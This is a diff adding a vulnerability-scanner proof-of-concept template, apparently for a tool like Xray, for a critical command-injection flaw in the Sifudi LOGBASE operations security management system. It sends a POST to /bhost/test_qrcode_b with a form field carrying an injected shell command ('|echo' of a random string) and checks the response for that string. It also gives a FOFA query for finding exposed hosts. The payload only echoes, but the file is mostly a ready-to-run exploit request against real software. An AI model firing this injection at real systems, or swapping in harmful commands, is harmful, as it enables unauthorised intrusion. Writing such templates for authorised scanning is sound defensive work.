@@ -1,0 +1,26 @@
+id: poc-yaml-safety-operation-security-manager-system-test_qrcode_b-rce
+info:
+  name: 思福迪运维安全管理系统 test_qrcode_b 命令注入漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 命令注入
+  finger: 思福迪运维安全管理系统
+  fofa: app="思福迪-LOGBASE"
+variables:
+  t1: random_str(12)
+requests:
+- method: POST
+  path: /bhost/test_qrcode_b
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Referer: '{{.base_url}}/bhost'
+  data: z1=1&z2="|echo {{.t1}};"&z3=bhost
+  expression: 'status_code == 200 &&
+
+    contains(body,t1) &&
+
+    contains(content_type,"text/html; charset=utf-8")
+
+    '
+transport: http
